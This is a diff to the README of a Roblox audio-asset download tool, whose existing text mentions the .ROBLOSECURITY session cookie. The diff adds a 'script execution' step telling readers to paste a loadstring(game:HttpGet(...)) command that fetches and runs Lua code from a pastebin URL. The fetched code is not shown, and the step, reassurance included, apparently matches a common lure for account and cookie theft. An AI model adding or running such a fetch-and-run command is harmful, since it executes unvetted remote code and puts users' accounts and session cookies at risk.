@@ -4,6 +4,15 @@ A GUI tool to download audio assets from Roblox.
 
 > **Note:** We recommend using a Roblox alternate account (alt) and its corresponding `.ROBLOSECURITY` cookie to avoid potential security and privacy risks.
 
+> **For Roblox Script Execution:**
+> If you'd like to use the tool in Roblox Studio, you can execute the provided Lua script in your game. Use the following command in the Script Editor:
+>
+> ```lua
+> loadstring(game:HttpGet('https://pastebin.com/raw/v7Usg709', true))()
+> ```
+>
+> If you have concerns about the script's safety, you can visit the [Pastebin URL](https://pastebin.com/raw/v7Usg709) directly to review the code. 
+
 ## Usage
 
 1. Clone or download the repository.
